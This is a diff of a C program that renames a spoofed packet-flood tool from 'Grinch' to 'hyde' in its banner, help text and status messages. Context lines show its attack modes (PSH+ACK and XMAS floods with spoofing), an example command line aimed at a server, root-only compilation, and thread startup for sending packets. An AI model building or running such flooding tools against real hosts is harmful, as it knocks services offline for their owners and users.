@@ -1,5 +1,5 @@
 /*
-        ..::Grinch:NetWork:FlowTest::..
+        ..::hyde:NetWork:FlowTest::..
                  __..._                                          
               ,-`      `',                                        
             ,'            \
@@ -53,7 +53,7 @@ coded by
   " 7 - PSH+ACK With Spoofing",
   " 8 - XMAS with Mirror Spoofing",
   "ex: ./code www.server.com 80 20000 4 5",
-  "..::Grinch:NetWork:FlowTest::..",
+  "..::hyde:NetWork:FlowTest::..",
 
  Need RooT to COmpile THis
   gcc -o hyde3 hyde3.c;
@@ -404,7 +404,7 @@ void help()
   " 7 - PSH+ACK With Spoofing\n"
   " 8 - XMAS with Mirror Spoofing\n"
   "ex: ./code www.server.com 80 20000 4 50\n"
-  "..::Grinch:NetWork:FlowTest::.. \n"
+  "..::hyde:NetWork:FlowTest::.. \n"
   "Coded by Cooler_ c00f3r[at]gmail[dot]com\n"
  );
 }
@@ -534,7 +534,7 @@ int main(int argc, char *argv[])
 // packing arguments 2 function
      ThreadArgv[0]=destino;
      ThreadArgv[1]=destino;
-     fprintf(stdout,"Grinch attack %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
+     fprintf(stdout,"hyde attack %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
 // start thread
       if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
        DEBUG("error in thread %d",count);
@@ -557,7 +557,7 @@ int main(int argc, char *argv[])
      inet_ntop (AF_INET, addr_ptr, addr_str, 256);
      ThreadArgv[0]=addr_str;
      ThreadArgv[1]=destino;
-     fprintf(stdout,"Grinch attack %s in port %u, spoofing %s in port %u\n", destino, port, addr_str, port);   
+     fprintf(stdout,"hyde attack %s in port %u, spoofing %s in port %u\n", destino, port, addr_str, port);   
 // start thread
       if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
        DEBUG("error in thread %d",count);
